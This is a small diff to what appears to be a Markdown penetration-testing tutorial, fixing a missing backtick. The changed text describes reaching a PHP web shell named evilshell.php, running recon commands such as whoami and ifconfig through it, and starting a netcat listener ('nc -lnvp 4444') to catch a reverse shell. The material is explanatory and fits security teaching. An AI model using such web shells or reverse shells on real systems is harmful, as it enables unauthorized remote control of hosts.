@@ -40,7 +40,7 @@ Use these links as references.
 - [PHP Passthru](https://www.php.net/manual/en/function.passthru.php){:target="_blank"}
 
 
-Use `http://<ip>/evilshell.php` to access the php based web shell. Any linux commands can be executed, like `whoami`, `uname -a`, `id`, `ifconfig`, `ps -ef, or windows commands can be executed, like `whoami`, `ver`, `ipconfig`, `taslist`, `netstat -an`.
+Use `http://<ip>/evilshell.php` to access the php based web shell. Any linux commands can be executed, like `whoami`, `uname -a`, `id`, `ifconfig`, `ps -ef`, or windows commands can be executed, like `whoami`, `ver`, `ipconfig`, `taslist`, `netstat -an`.
 
 A reverse shell can also be spawned. A `netcat` listener can be spawned as below.
 {% capture code %}{% raw %}nc -lnvp 4444{% endraw %}{% endcapture %} {% include code.html code=code lang="bash"%}
